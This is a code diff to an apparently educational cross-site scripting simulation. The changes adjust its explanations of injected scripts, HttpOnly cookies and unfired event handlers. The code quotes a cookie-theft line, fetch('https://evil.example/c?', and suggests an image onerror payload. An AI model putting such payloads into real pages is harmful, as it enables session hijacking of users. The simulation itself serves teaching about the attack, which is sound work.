@@ -66,21 +66,24 @@ function reportScript(story: Story, script: ScriptRun, emptyCookie: boolean) {
     ran: 'A script runs in the shop\'s origin',
     blocked: 'A script is blocked',
     'not understood': 'A script the simulation can\'t read',
-    'waits for a click': 'A script waits for a click',
+    'waits for a click': 'A handler is waiting',
     'failed to load': 'A script fails to load',
   };
   let why = script.actions.join(' ');
   if (script.status === 'ran') why = `It did this: ${why}. The browser can't tell it from the shop's own code, so it can do anything the page can.`;
   if (script.status === 'not understood') why = notUnderstood;
-  if (script.status === 'waits for a click') why = 'This handler only runs if someone clicks, so no one has run it yet. It is still in the page, and it is still a bug.';
+  if (script.status === 'waits for a click') why = 'This simulation only fires onerror on an image and onload on svg or body. Other handlers wait for their event, and a real browser fires some with no click.';
   if (emptyCookie) why += ' The sid cookie is HttpOnly, so document.cookie gave empty text. That saved the cookie, but the script still ran.';
   story.step({ title: heading[script.status], why, line: "fetch('https://evil.example/c?'", text: { label: 'Script', lines: { Source: script.source } } });
 }
 
-const summary = (ran: boolean, encoded: boolean, input: string, inert: boolean) => {
-  if (ran) return 'The input became code on the shop\'s page. The browser ran it with everything that page has.';
+const summary = (scripts: ScriptRun[], encoded: boolean, input: string, inert: boolean) => {
+  const has = (status: ScriptRun['status']) => scripts.some((script) => script.status === status);
+  if (has('ran')) return 'The input became code on the shop\'s page. The browser ran it with everything that page has.';
   if (encoded) return /[<>&"']/.test(input) ? 'Encoding turned the markup into text, so the browser drew it and ran nothing.' : 'This text had nothing to encode, so the page simply shows it.';
   if (inert) return 'A <script> tag set through innerHTML stays inert. Browsers do not run it, so this payload does nothing here. Try an image tag with onerror.';
+  if (has('not understood')) return 'The simulation could not read this script, so it ran nothing. A browser would try.';
+  if (has('waits for a click')) return 'Nothing ran here, but the handler is in the page, and it is still a bug.';
   return 'Nothing in this text ran.';
 };
 
@@ -118,16 +121,16 @@ export function crossSiteScriptingSteps(values: Record<string, string>): Step[] 
     text: { label: 'Page', lines: { Source: html } },
   });
   const stolenBefore = evilStolen(world);
-  const emptyCookie = httpOnly && stolenBefore.includes('');
-  for (const script of scripts) reportScript(story, script, emptyCookie && script.status === 'ran');
+  const readsCookie = (script: ScriptRun) => script.actions.some((action) => action.endsWith('/c?'));
+  for (const script of scripts) reportScript(story, script, httpOnly && readsCookie(script));
 
   const ran = scripts.some((script) => script.status === 'ran');
   const inert = findScripts(input.value, 'page').length > findScripts(input.value, 'inner').length;
   const stolen = stolenBefore.filter((text) => text.includes('sid='));
-  const shown = stolen[0] ?? (stolenBefore.includes('') ? 'empty text' : 'nothing');
+  const shown = stolen[0] ?? (httpOnly && scripts.some(readsCookie) ? 'empty text' : 'nothing');
   story.step({
     title: ran ? 'The input ran as code' : 'Nothing ran',
-    why: `${summary(ran, encoded, input.value, inDom && inert)}${stolen.length > 0 ? ` evil.example now holds ${stolen[0]}, and the attacker can use it as alice.` : ''}`,
+    why: `${summary(scripts, encoded, input.value, inDom && inert)}${stolen.length > 0 ? ` evil.example now holds ${stolen[0]}, and the attacker can use it as alice.` : ''}`,
     line: 'function encode',
     variables: { stolen: shown, result: resultOf(ran) },
   });
